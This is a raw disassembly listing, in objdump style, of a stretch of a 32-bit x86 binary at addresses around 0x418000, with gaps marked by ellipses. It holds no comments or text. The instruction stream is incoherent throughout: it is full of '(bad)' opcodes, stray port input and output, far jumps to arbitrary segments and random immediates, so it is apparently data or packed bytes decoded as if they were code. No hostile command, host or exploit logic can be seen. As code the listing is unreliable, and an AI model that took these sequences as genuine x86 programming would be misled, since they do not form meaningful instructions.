  418027:	xchg   ebx,eax
  418028:	sub    ecx,DWORD PTR [esi-0x1c]
  41802b:	mov    ch,0xd1
  41802d:	cmp    al,0x13
  41802f:	fiadd  DWORD PTR [esi]
  418031:	frstor [eax+0x6eed]
	...
  418093:	add    BYTE PTR [eax],al
  418095:	add    BYTE PTR [ecx-0xba9482],ch
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx+0x2dbb98c4]
  4180a3:	adc    ch,al
  4180a5:	pop    edx
  4180a6:	and    esp,edi
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    BYTE PTR [edx-0x79],ch
  4180b0:	pop    ds
  4180b1:	shl    BYTE PTR [esi-0x7357e3cb],cl
  4180b7:	mov    eax,ds:0xbe121f0b
  4180bc:	nop
  4180bd:	rcr    DWORD PTR [edx-0x47],cl
  4180c0:	(bad)  
  4180c1:	aaa    
  4180c2:	jle    0x418079
  4180c4:	push   0xfe281fa9
  4180c9:	push   0x28ff1f59
  4180ce:	pushf  
  4180cf:	jns    0x4180e2
  4180d1:	test   ebp,ebp
  4180d3:	mov    eax,DWORD PTR [edi]
  4180d5:	leave  
  4180d6:	mul    BYTE PTR [esi]
  4180d8:	data16 je 0x4180dd
  4180db:	mov    dl,0xa2
  4180dd:	xlat   BYTE PTR ds:[ebx]
  4180de:	jo     0x418066
  4180e0:	cdq    
  4180e1:	cmp    ecx,DWORD PTR [edi-0xe73c44]
  4180e7:	int    0x5e
  4180e9:	push   ecx
  4180ea:	(bad)  
  4180eb:	pop    ecx
  4180ec:	sbb    al,0x5b
  4180ee:	loopne 0x41810b
  4180f0:	push   eax
  4180f1:	dec    eax
  4180f2:	and    eax,0x9bd0b54a
  4180f7:	es dec ebx
  4180f9:	iret   
  4180fa:	cmp    BYTE PTR [esi],bl
  4180fc:	and    DWORD PTR [eax],0x9153b54f
  418102:	loop   0x4180ec
  418104:	pop    ss
  418105:	or     eax,0xf3b2405a
  41810a:	cmp    al,0x13
  41810c:	out    dx,eax
  41810d:	retf   0x716f
  418110:	fstp   QWORD PTR [edi-0x8b58220]
  418116:	ins    DWORD PTR es:[edi],dx
  418117:	outs   dx,BYTE PTR ds:[esi]
  418118:	xor    DWORD PTR [ebx+0x7c],ecx
  41811b:	dec    eax
  41811c:	repnz xlat BYTE PTR ds:[ebx]
  41811e:	cld    
  41811f:	xchg   ecx,eax
  418120:	cmp    BYTE PTR [esi-0x4f1fe167],0x99
  418127:	mov    BYTE PTR [edx+0x4efe6c30],cl
  41812d:	dec    ebp
  41812e:	mov    al,ds:0xa55233a9
  418133:	repz add DWORD PTR [edi-0x2b],ecx
  418137:	rcl    DWORD PTR [ecx+0x1dda0fc7],cl
  41813d:	jno    0x41817e
  41813f:	jp     0x41810a
  418141:	dec    eax
  418142:	ffreep st(5)
  418144:	push   0xffffffca
  418146:	cmp    DWORD PTR [ebx+0x1],ebp
  418149:	mov    ds:0x8914098e,eax
  41814e:	mov    WORD PTR [esi+0x361f2720],fs
  418154:	shr    DWORD PTR [ebx+0x780691e5],0x32
  41815b:	jo     0x418122
  41815d:	shl    BYTE PTR [ebx],1
  41815f:	xchg   ebp,eax
  418160:	aas    
  418161:	xor    DWORD PTR [ebx+0x58],0xc4628a73
  418168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418169:	ins    BYTE PTR es:[edi],dx
  41816a:	fnstsw WORD PTR [eax-0x4d]
  41816d:	pop    edi
  41816e:	jae    0x41813e
  418170:	clc    
  418171:	pop    es
  418172:	cmp    eax,0x82750f26
  418177:	lock xor DWORD PTR [ebp+0x69],esi
  41817b:	ds inc ebx
  41817d:	cdq    
  41817e:	stos   DWORD PTR es:[edi],eax
  41817f:	sub    ch,bh
  418181:	lods   al,BYTE PTR ds:[esi]
  418182:	sbb    BYTE PTR [ebx-0x29],dh
  418185:	push   ebp
  418186:	add    al,0x6f
  418188:	dec    ecx
  418189:	cmp    eax,0x6d9116de
  41818e:	sub    al,0x7f
  418190:	and    DWORD PTR [ecx+eiz*4],edx
  418193:	scas   al,BYTE PTR es:[edi]
  418194:	add    DWORD PTR [ecx],0xe9211f13
  41819a:	vunpcklpd xmm5,xmm6,XMMWORD PTR [esi-0x2291d7a3]
  4181a2:	sub    ebp,0xc30e1124
  4181a8:	mov    ecx,0x3559d77e
  4181ad:	xor    eax,0x833fd26e
  4181b2:	mov    ecx,0xbba8
	...
  418213:	add    BYTE PTR [eax],al
  418215:	add    BYTE PTR [edi],dh
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418223:	fist   WORD PTR [eax+0xfd282b]
  418229:	add    BYTE PTR [edi],al
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [ecx],cl
  41822f:	aas    
  418230:	sbb    eax,0x493be5fa
  418235:	add    eax,0x9064a9d6
  41823a:	sahf   
  41823b:	jns    0x4181ed
  41823d:	sbb    edx,DWORD PTR [ebp+eiz*1-0x3314422a]
  418244:	pop    esp
  418245:	and    DWORD PTR [ebp+0x70cf71a1],edx
  41824b:	jne    0x418244
  41824d:	cmp    eax,0x5056eec5
  418252:	lods   eax,DWORD PTR ds:[esi]
  418253:	aad    0xa8
  418255:	pusha  
  418256:	inc    ebp
  418257:	jo     0x4181fc
  418259:	push   cs
  41825a:	ja     0x4181f3
  41825c:	push   edi
  41825d:	pop    edx
  41825e:	mov    ebp,0x3fa02885
  418263:	stos   DWORD PTR es:[edi],eax
  418264:	pop    es
  418265:	jmp    0x41820e
  418267:	mov    al,0xab
  418269:	mov    esp,0x7e36b5f4
  41826e:	and    eax,edx
  418270:	inc    eax
  418271:	dec    edi
  418272:	jae    0x418279
  418274:	lds    edi,FWORD PTR [edi]
  418276:	out    0xe7,al
  418278:	push   edx
  418279:	dec    edx
  41827a:	(bad)  
  41827b:	into   
  41827c:	jb     0x41826a
  41827e:	cmp    edi,0x39
  418281:	and    al,0x8a
  418283:	cwde   
  418284:	test   BYTE PTR [ecx+0x86e9d53],dl
  41828a:	jecxz  0x41824e
  41828c:	inc    DWORD PTR [ebp-0x1a6e0a31]
  418292:	loope  0x4182c1
  418294:	jmp    0x9019:0x30d8bb02
  41829b:	pop    ebp
  41829c:	cmp    ah,BYTE PTR [ecx+0x6b]
  41829f:	rcr    BYTE PTR [ecx+0x6ba354eb],cl
  4182a5:	push   esp
  4182a6:	arpl   WORD PTR [esp+esi*2],bx
  4182a9:	jns    0x41826e
  4182ab:	or     DWORD PTR [edi+0x7f9508b4],ebx
  4182b1:	div    DWORD PTR [edx]
  4182b3:	push   ecx
  4182b4:	xor    eax,DWORD PTR ds:0x1c71
  4182b9:	scas   al,BYTE PTR es:[edi]
  4182ba:	add    BYTE PTR [edi+0x59],ah
  4182bd:	pop    es
  4182be:	inc    ecx
  4182bf:	mov    al,ds:0x666db5e7
  4182c4:	mov    ebp,0x457eadf0
  4182c9:	frstor [esi+0x50]
  4182cc:	xchg   edx,eax
  4182cd:	addr16 pop ecx
  4182cf:	xchg   ebx,eax
  4182d0:	dec    ecx
  4182d1:	dec    edi
  4182d2:	jns    0x4182f5
  4182d4:	(bad)  
  4182d6:	dec    edi
  4182d7:	inc    esp
  4182d8:	rcl    BYTE PTR [edi],0xc3
  4182db:	mov    ebx,0x50bc2bf2
  4182e0:	jmp    0x3857:0xf752079b
  4182e7:	leave  
  4182e8:	jb     0x41829e
  4182ea:	mov    ds:0xbc7610c1,al
  4182ef:	dec    ecx
  4182f0:	cdq    
  4182f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f2:	lea    edi,[esp+ebp*2+0x3b8aac58]
  4182f9:	loop   0x4182a9
  4182fb:	cmp    dl,BYTE PTR [esi-0x57bd3b67]
  418301:	pop    edi
  418302:	xor    edx,DWORD PTR [ecx]
  418304:	rcr    BYTE PTR [ecx],1
  418306:	adc    DWORD PTR [edx-0x70644042],edx
  41830c:	lock std 
  41830e:	add    dl,BYTE PTR [ebx]
  418310:	int3   
  418311:	stc    
  418312:	mov    esi,0xed495132
  418317:	mov    edi,0x93b81f6b
  41831c:	daa    
  41831d:	pop    ebx
  41831e:	(bad)  
  41831f:	dec    ebx
  418320:	jl     0x418318
  418322:	lahf   
  418323:	les    edi,FWORD PTR [edx-0x2e461108]
  418329:	mov    edi,0xdc25a862
  41832e:	and    DWORD PTR [ebp+0x6842f150],ebp
  418334:	ins    BYTE PTR es:[edi],dx
	...
  418395:	add    ah,bl
  418397:	mov    bl,0x3f
  418399:	push   eax
  41839a:	jg     0x418378
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	outs   dx,BYTE PTR ds:[esi]
  4183a3:	sub    eax,0xfe2f2c5a
  4183a8:	add    BYTE PTR [eax],al
  4183aa:	pop    es
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [ecx-0x6271456e],cl
  4183b3:	ss cld 
  4183b5:	loop   0x4183a1
  4183b7:	lods   eax,DWORD PTR ds:[esi]
  4183b8:	(bad)  
  4183b9:	(bad)  
  4183ba:	outs   dx,DWORD PTR ds:[esi]
  4183bb:	xchg   ecx,eax
  4183bc:	sub    DWORD PTR [ecx-0x6f],esi
  4183bf:	push   eax
  4183c0:	jno    0x418365
  4183c2:	js     0x41841d
  4183c4:	lock (bad) 
  4183c6:	mov    BYTE PTR [edx-0x2029327d],0x50
  4183cd:	imul   ebx,DWORD PTR [ebx],0x238fff3b
  4183d3:	cld    
  4183d4:	ret    
  4183d5:	out    0x19,al
  4183d7:	xchg   esp,eax
  4183d8:	imul   esi,DWORD PTR [ecx+0x7463f477],0xd853f53a
  4183e2:	jg     0x41837d
  4183e4:	add    BYTE PTR ds:0x29ebdb76,bl
  4183ea:	adc    ebp,esi
  4183ec:	pop    ebx
  4183ed:	hlt    
  4183ee:	arpl   WORD PTR [ecx-0x48],bp
  4183f1:	cmp    edx,DWORD PTR [edx]
  4183f3:	mov    es:0xd3d92aa,al
  4183f9:	mov    bl,0xe4
  4183fb:	xchg   ebp,eax
  4183fc:	sbb    edi,DWORD PTR [ebx-0x6a]
  4183ff:	clc    
  418400:	in     eax,dx
  418401:	lahf   
  418402:	inc    esp
  418403:	xchg   edi,eax
  418404:	jecxz  0x4183ef
  418406:	inc    edi
  418407:	imul   eax,DWORD PTR [esi+0x5655ef65],0xec1802d6
  418411:	adc    ah,BYTE PTR [edi-0x7629b8e2]
  418417:	out    0x4c,al
  418419:	cmp    cl,BYTE PTR [ebx-0x71086b92]
  41841f:	sbb    ecx,DWORD PTR [edi]
  418421:	xor    DWORD PTR [ebp+0x5e2cefe1],0x4e
  418428:	adc    dl,BYTE PTR [eax-0x6abe8f9f]
  41842e:	add    esi,DWORD PTR [esi+0x5b95d15f]
  418434:	shr    DWORD PTR [ecx],1
  418436:	push   esp
  418437:	ficom  WORD PTR [ebx-0x76]
  41843a:	ja     0x41842e
  41843c:	cli    
  41843d:	scas   eax,DWORD PTR es:[edi]
  41843e:	rcr    al,1
  418440:	adc    BYTE PTR [edx-0x2bb8139b],bl
  418446:	xchg   esp,eax
  418447:	and    edi,DWORD PTR [ebx+0x3]
  41844a:	add    al,BYTE PTR [esi]
  41844c:	dec    ebx
  41844d:	inc    eax
  41844e:	mov    al,0x8f
  418450:	or     ebx,DWORD PTR [edx]
  418452:	(bad)  
  418453:	fcom   DWORD PTR [edi+0x0]
  418456:	push   ds
  418457:	push   esp
  418458:	sar    DWORD PTR [eax+edx*8+0xd],1
  41845c:	in     al,0x5e
  41845e:	push   cs
  41845f:	pop    edi
  418460:	add    al,0xc0
  418462:	imul   ebp,DWORD PTR [edx-0x142dcc4c],0x6561b4a1
  41846c:	xchg   edi,eax
  41846d:	idiv   BYTE PTR ds:0xeac81a40
  418473:	mov    esi,0x6d7654c2
  418478:	mov    ch,0xa5
  41847a:	xchg   bh,bl
  41847c:	imul   ebx,ebp,0xffffffaf
  41847f:	adc    DWORD PTR [ebx],ebx
  418481:	xor    al,0xf1
  418483:	xchg   ebp,eax
  418484:	out    dx,eax
  418485:	fmul   DWORD PTR [edx-0x63]
  418488:	aaa    
  418489:	sbb    DWORD PTR [edx+0x68],edi
  41848c:	dec    ebx
  41848d:	add    esi,DWORD PTR [ecx+ebp*1+0x4302b724]
  418494:	pushf  
  418495:	add    al,ch
  418497:	mov    WORD PTR [edx-0x22d3f1e9],ds
  41849d:	jmp    0x4184cd
  41849f:	mov    DWORD PTR [esi+0x7fb5b543],esi
  4184a5:	les    ebx,FWORD PTR [edi+0x2ea919b5]
  4184ab:	mov    ch,0x43
  4184ad:	adc    DWORD PTR [edi-0x3c],ebp
  4184b0:	dec    ebp
  4184b1:	mov    ch,0x8c
  4184b3:	icebp  
  4184b4:	mov    esi,0x0
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [eax+eax*4+0x360401a0]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [ebx-0x42],al
  418530:	pop    ecx
  418531:	loop   0x418559
  418533:	je     0x4184f2
  418535:	int3   
  418536:	inc    edi
  418537:	fsub   st(4),st
  418539:	jge    0x4184bd
  41853b:	push   ebx
  41853c:	daa    
  41853d:	xor    DWORD PTR [eax+0x2040142c],esi
  418543:	cmp    dh,dh
  418545:	adc    eax,0x3f71b6a2
  41854a:	push   ecx
  41854b:	ss add eax,0x118780f9
  418551:	cld    
  418552:	and    DWORD PTR [eax],ebx
  418554:	pop    es
  418555:	mov    al,0xa0
  418557:	mov    BYTE PTR [eax+0x76],al
  41855a:	leave  
  41855b:	not    BYTE PTR [edx]
  41855d:	ret    0xe5a5
  418560:	loope  0x41859a
  418562:	faddp  st(3),st
  418564:	mov    ebx,0xf34a558b
  418569:	xchg   edx,eax
  41856a:	push   edx
  41856b:	sub    BYTE PTR [esi],bh
  41856d:	xchg   ecx,eax
  41856e:	mov    bh,0x4c
  418570:	dec    ebp
  418571:	sbb    al,0x57
  418573:	sbb    ebx,ebp
  418575:	and    BYTE PTR [edi+ecx*1-0x5f],dh
  418579:	adc    cl,bl
  41857b:	lea    ebp,[eax-0x23]
  41857e:	push   esi
  41857f:	outs   dx,BYTE PTR ds:[esi]
  418580:	adc    al,bl
  418582:	inc    ebx
  418583:	fcomp  DWORD PTR [ecx-0x22e76741]
  418589:	cmp    edx,DWORD PTR [ebx+edx*4]
  41858c:	xor    cl,al
  41858e:	mov    edi,0xed15e0b4
  418593:	and    eax,0x226330bc
  418598:	jae    0x4185c6
  41859a:	cmc    
  41859b:	xor    DWORD PTR [ebx-0x57d78a9b],esi
  4185a1:	(bad)  
  4185a2:	(bad)  
  4185a3:	(bad)  
  4185a5:	(bad)  
  4185a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185a7:	(bad)  
  4185a8:	int    0xbe
  4185aa:	push   cs
  4185ab:	lock inc eax
  4185ad:	push   es
  4185ae:	mov    ecx,0x6e65781b
  4185b3:	sub    BYTE PTR [edx+0x58ac7e02],cl
  4185b9:	sbb    BYTE PTR [edx],bl
  4185bb:	mov    eax,ds:0x4efb4275
  4185c0:	pop    eax
  4185c1:	xor    edi,DWORD PTR [edi-0x63efc207]
  4185c7:	pop    eax
  4185c8:	add    esi,DWORD PTR [ebx+esi*4]
  4185cb:	in     eax,0xd4
  4185cd:	sahf   
  4185ce:	dec    edi
  4185cf:	xlat   BYTE PTR ds:[ebx]
  4185d0:	sbb    al,0x17
  4185d2:	js     0x41864b
  4185d4:	mov    gs,WORD PTR ds:0xdb414f3
  4185da:	retf   0x5d6b
  4185dd:	aam    0xb2
  4185df:	cmp    al,0x38
  4185e1:	(bad)  
  4185e2:	ficomp DWORD PTR [edi+0x3f]
  4185e5:	jle    0x418646
  4185e7:	popf   
  4185e8:	xor    al,0x7c
  4185ea:	or     DWORD PTR [edi],eax
  4185ec:	jmp    0xdd01547b
  4185f1:	or     al,dh
  4185f3:	std    
  4185f4:	test   eax,0x5191918f
  4185f9:	mov    esp,0xf810c3a1
  4185fe:	daa    
  4185ff:	add    DWORD PTR [ebx],esi
  418601:	add    ebp,DWORD PTR ds:0x9085924
  418607:	popf   
  418608:	dec    esi
  418609:	cmp    al,0x69
  41860b:	test   al,0x60
  41860d:	xor    edx,DWORD PTR [eax+0x7566bc01]
  418613:	imul   edx,DWORD PTR gs:[ecx],0x5270c675
  41861a:	push   ss
  41861b:	mov    dh,0xc0
  41861d:	iret   
  41861e:	sbb    BYTE PTR [ecx+0x202b8c79],bl
  418624:	dec    ebx
  418625:	xor    eax,0x3b71dd49
  41862a:	or     ch,BYTE PTR [edi+0x5d89deed]
  418630:	mov    al,0x35
  418632:	call   0x424f90
	...
  418693:	add    BYTE PTR [eax],al
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi-0x3d01913f],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [esi],ch
  4186af:	push   edi
  4186b0:	sar    DWORD PTR [ebx+0x76102d3c],0x76
  4186b7:	and    eax,0x4fae6a46
  4186bc:	shr    DWORD PTR ds:0x9739b2d4,1
  4186c2:	cmp    DWORD PTR [esi-0x25fa09bb],ecx
  4186c8:	xor    BYTE PTR ds:0x5e174ed5,cl
  4186ce:	dec    ebx
  4186cf:	(bad)  
  4186d0:	mov    bh,0x87
  4186d2:	pop    ds
  4186d3:	loop   0x41865b
  4186d5:	lock push ss
  4186d7:	xchg   ebp,eax
  4186d8:	test   al,0x87
  4186da:	add    BYTE PTR [eax],dh
  4186dc:	xor    eax,0x8de58a03
  4186e1:	dec    dh
  4186e3:	cmp    al,0x2a
  4186e5:	jmp    0xff0830a7
  4186ea:	inc    ebp
  4186eb:	mov    dl,0xb3
  4186ed:	jmp    0xb080:0xbedeff6c
  4186f4:	or     al,0x15
  4186f6:	push   esi
  4186f7:	xor    al,0x6a
  4186f9:	js     0x418762
  4186fb:	aam    0xb8
  4186fd:	xchg   edi,eax
  4186fe:	hlt    
  4186ff:	cmp    DWORD PTR [ebx-0x67],eax
  418702:	mov    eax,ds:0xfe6faf77
  418707:	sbb    ah,BYTE PTR [eax-0x7252c424]
  41870d:	dec    edx
  41870e:	(bad)  
  41870f:	(bad)  
  418710:	scas   eax,DWORD PTR es:[edi]
  418711:	pop    ds
  418712:	xchg   ebx,eax
  418713:	push   esi
  418714:	sbb    ebx,ebp
  418716:	lods   eax,DWORD PTR ds:[esi]
  418717:	std    
  418718:	jecxz  0x4186c8
  41871a:	xor    BYTE PTR [eax],ah
  41871c:	pop    eax
  41871d:	mov    ?,WORD PTR [eax+eiz*1]
  418720:	mov    cl,0x2e
  418722:	adc    BYTE PTR [eax+edx*2],dh
  418725:	jmp    0x418725
  418727:	sbb    ah,BYTE PTR [edi+0x20]
  41872a:	sub    eax,0x1e85f586
  41872f:	retf   0x7ae8
  418732:	xchg   esp,eax
  418733:	inc    esp
  418734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418735:	xor    dh,BYTE PTR [ecx-0x162cd2e8]
  41873b:	leave  
  41873c:	pop    ebx
  41873d:	xchg   ecx,eax
  41873e:	aaa    
  41873f:	mov    edi,0x86cdaac5
  418744:	push   ds
  418745:	je     0x418774
  418747:	(bad)  
  418748:	jnp    0x418779
  41874a:	ss inc esi
  41874c:	pop    esp
  41874d:	cs jmp 0xa369:0xa0a429d0
  418755:	mov    al,ds:0x88f811ec
  41875a:	fdiv   DWORD PTR ds:[ecx+0x769d2111]
  418761:	xor    al,0xd
  418763:	outs   dx,DWORD PTR ds:[esi]
  418764:	push   es
  418765:	(bad)  
  418766:	push   ecx
  418767:	jb     0x4186fd
  418769:	sub    BYTE PTR [eax+0x19867f3a],0xa5
  418770:	mov    edi,0x3870641b
  418775:	and    cl,BYTE PTR [esi+0x913ff]
  41877b:	fiadd  WORD PTR [esi]
  41877d:	push   esp
  41877e:	ds lahf 
  418780:	mov    eax,0x2134ecc6
  418785:	cmp    al,0xe9
  418787:	sbb    DWORD PTR [ecx+0x2033f3f9],ebp
  41878d:	cwde   
  41878e:	cwde   
  41878f:	sub    esp,DWORD PTR [ebx+0x3fd3a9ff]
  418795:	xchg   DWORD PTR [eax+edi*4],edx
  418798:	lds    eax,FWORD PTR [esi]
  41879a:	mov    ss,WORD PTR [edi-0x27]
  41879d:	loope  0x41881a
  41879f:	adc    bh,BYTE PTR [esi+edx*2-0x6216ce82]
  4187a6:	push   esi
  4187a7:	xchg   ebx,eax
  4187a8:	push   es
  4187a9:	dec    edx
  4187aa:	outs   dx,BYTE PTR ds:[esi]
  4187ab:	jns    0x4187dd
  4187ad:	shr    DWORD PTR [ebx+0x3b],0x1c
  4187b1:	and    al,0x5a
  4187b3:	and    al,0x37
	...
  418815:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41881c:	hlt    
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0x3ad97be5
  418824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418825:	mov    ecx,0x10144
  41882a:	pop    es
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [edi+ecx*2-0x51],bl
  418831:	push   0x8e574342
  418836:	shl    DWORD PTR [ebp-0x4d469637],cl
  41883c:	sub    eax,0xd293660d
  418841:	jge    0x4187d9
  418843:	cmp    BYTE PTR [edi-0x1],ah
  418846:	sub    esp,DWORD PTR [edi]
  418848:	scas   al,BYTE PTR es:[edi]
  418849:	or     edi,ebp
  41884b:	pop    esp
  41884c:	stos   DWORD PTR es:[edi],eax
  41884d:	scas   al,BYTE PTR es:[edi]
  41884e:	test   al,0xfe
  418850:	iret   
  418851:	add    DWORD PTR [ecx+esi*4],ebp
  418854:	ins    BYTE PTR es:[edi],dx
  418855:	nop
  418856:	jecxz  0x4187f9
  418858:	dec    edx
  418859:	pop    ds
  41885a:	jnp    0x41888f
  41885c:	mov    dl,0x7f
  41885e:	repnz test DWORD PTR [ebx-0x75],ebp
  418862:	js     0x41881f
  418864:	pop    ds
  418865:	fisubr WORD PTR [edi+eax*2]
  418868:	les    esp,FWORD PTR [ebp+0x5a]
  41886b:	fwait
  41886c:	dec    edi
  41886d:	mov    dh,BYTE PTR [edx+0x6b59274a]
  418873:	inc    ebx
  418874:	rol    BYTE PTR [esi+0x5b],cl
  418877:	shl    esp,cl
  418879:	retf   0x426b
  41887c:	sub    BYTE PTR [edi-0xe25e9ee],0xbe
  418883:	jmp    0xdfc9:0x5993d651
  41888a:	dec    edi
  41888b:	pop    edx
  41888c:	mov    bl,0xdc
  41888e:	clc    
  41888f:	stc    
  418890:	clc    
  418891:	push   cs
  418892:	jno    0x4188fd
  418894:	ss faddp st(4),st
  418897:	push   eax
  418898:	sbb    dh,BYTE PTR [ebx]
  41889a:	in     al,0x5f
  41889c:	mov    ch,0xef
  41889e:	mov    DWORD PTR [ebx-0x16609239],esp
  4188a4:	mov    BYTE PTR [ebx+0x41],bh
  4188a7:	mov    edi,0x5c03a148
  4188ac:	int3   
  4188ad:	add    eax,0x4542d85b
  4188b2:	sub    eax,0xd2db2714
  4188b7:	rep outs dx,DWORD PTR ds:[esi]
  4188b9:	pop    ebx
  4188ba:	dec    eax
  4188bb:	push   edx
  4188bc:	push   ebp
  4188bd:	iret   
  4188be:	pop    ebp
  4188bf:	int    0x7a
  4188c1:	pop    ebp
  4188c2:	mov    ch,0x90
  4188c4:	xchg   BYTE PTR [ecx],cl
  4188c6:	enter  0xa304,0x5a
  4188ca:	add    al,0xfe
  4188cc:	dec    al
  4188ce:	add    ah,BYTE PTR [ecx+ecx*2]
  4188d1:	nop
  4188d2:	jb     0x41888c
  4188d4:	xchg   ebp,eax
  4188d5:	jbe    0x418917
  4188d7:	rol    DWORD PTR [edi-0x3a0c23c5],cl
  4188dd:	fild   WORD PTR [edx-0x4017bf99]
  4188e3:	or     DWORD PTR [esi],eax
  4188e5:	fsub   DWORD PTR [ebx-0x23]
  4188e8:	in     al,dx
  4188e9:	mov    ecx,0x70171853
  4188ee:	(bad)  
  4188ef:	sar    ebx,cl
  4188f1:	aad    0xce
  4188f3:	push   0xe0376185
  4188f8:	lods   eax,DWORD PTR ds:[esi]
  4188f9:	cld    
  4188fa:	lds    esp,FWORD PTR [ebx+0x63]
  4188fd:	mov    al,ds:0x64f0e9e5
  418902:	div    BYTE PTR ds:0x57b88ec6
  418908:	adc    esp,DWORD PTR [edx+0xd6decb8]
  41890e:	shl    BYTE PTR [ecx-0x2189b5b2],0xe6
  418915:	jmp    0xac8:0xf0135036
  41891c:	pop    eax
  41891d:	xchg   edi,eax
  41891e:	test   DWORD PTR [ebx+0x38bdb3f8],edi
  418924:	rcr    BYTE PTR [ebx-0x15e2eca7],1
  41892a:	add    al,0x12
  41892c:	jl     0x41897d
  41892e:	inc    edx
  41892f:	shl    BYTE PTR [edx+0x1d],1
  418932:	xor    al,0x4f
  418934:	aam    0x0
	...
  418996:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi-0x3b1743a3]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    bl,ch
  4189af:	push   edi
  4189b0:	ins    DWORD PTR es:[edi],dx
  4189b1:	leave  
  4189b2:	mov    bl,0x7d
  4189b4:	loop   0x4189d4
  4189b6:	in     al,0x1f
  4189b8:	mov    dh,0x22
  4189ba:	xchg   esi,eax
  4189bb:	and    BYTE PTR [edx],dl
  4189bd:	(bad)  [ecx+0x4b5174f9]
  4189c3:	cmp    al,0xab
  4189c5:	out    0xfc,eax
  4189c7:	(bad)  
  4189c8:	xchg   ebp,eax
  4189c9:	loop   0x4189aa
  4189cb:	clc    
  4189cc:	outs   dx,BYTE PTR ds:[esi]
  4189cd:	test   al,0xbb
  4189cf:	je     0x4189b8
  4189d1:	jl     0x418a2d
  4189d3:	jno    0x4189ae
  4189d5:	in     al,0xbc
  4189d7:	mov    bh,0x92
  4189d9:	je     0x418a10
  4189db:	loop   0x4189e5
  4189dd:	inc    eax
  4189de:	retf   0x4a93
  4189e1:	inc    edx
  4189e2:	push   cs
  4189e3:	inc    edi
  4189e4:	out    dx,eax
  4189e5:	mov    esp,0x783f1b93
  4189ea:	adc    BYTE PTR [esi],cl
  4189ec:	hlt    
  4189ed:	and    eax,0x58c0a8bf
  4189f2:	clc    
  4189f3:	dec    edx
  4189f4:	or     DWORD PTR [eax],0x61
  4189f7:	loop   0x418a0b
  4189f9:	mov    ds:0xfaf2a4bf,eax
  4189fe:	dec    ecx
  4189ff:	div    BYTE PTR [eax]
  418a01:	repz enter 0x5533,0x66
  418a06:	jle    0x4189f8
  418a08:	adc    dh,BYTE PTR [ecx+0x7abb2758]
  418a0e:	inc    esp
  418a0f:	test   BYTE PTR [edi],ch
  418a11:	test   al,0x71
  418a13:	scas   al,BYTE PTR es:[edi]
  418a14:	pcmpgtd mm1,QWORD PTR [ebp+0x22]
  418a18:	jl     0x4189d8
  418a1a:	aam    0x2b
  418a1c:	mov    bl,0x69
  418a1e:	ins    BYTE PTR es:[edi],dx
  418a1f:	sbb    esp,esi
  418a21:	popf   
  418a22:	pusha  
  418a23:	cli    
  418a24:	mov    cl,0xb7
  418a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a27:	(bad)  
  418a28:	cmc    
  418a29:	mov    esi,0x3e2851f3
  418a2e:	mov    bl,0x27
  418a30:	and    BYTE PTR [ebp+0x2a],cl
  418a33:	inc    edx
  418a34:	sbb    eax,0xb89e4f3a
  418a39:	je     0x418a6f
  418a3b:	jmp    0x836d163c
  418a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a41:	dec    ebp
  418a42:	cmp    bl,ah
  418a44:	daa    
  418a45:	aaa    
  418a46:	jne    0x418aa8
  418a48:	and    BYTE PTR [edx*2+0x43d4edaa],ch
  418a4f:	loopne 0x418ab0
  418a51:	xchg   BYTE PTR [edi+0x1f],bl
  418a54:	retf   0x202e
  418a57:	push   ds
  418a58:	dec    esp
  418a59:	dec    ecx
  418a5a:	popa   
  418a5b:	mov    esp,DWORD PTR [eax-0x75]
  418a5e:	ds rcr BYTE PTR ds:[edx+ebp*8+0x523a5c6f],0x8f
  418a68:	push   edx
  418a69:	div    BYTE PTR [ebp+0x51]
  418a6c:	into   
  418a6d:	pop    ebp
  418a6e:	add    DWORD PTR [edx+0x54],edi
  418a71:	pop    edi
  418a72:	stos   BYTE PTR es:[edi],al
  418a73:	inc    ebx
  418a74:	xchg   ecx,eax
  418a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a76:	xchg   ecx,eax
  418a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a78:	pop    edx
  418a79:	pop    es
  418a7a:	cmp    ch,BYTE PTR [ecx]
  418a7c:	pop    ds
  418a7d:	out    0xc3,al
  418a7f:	add    DWORD PTR [edi],ebp
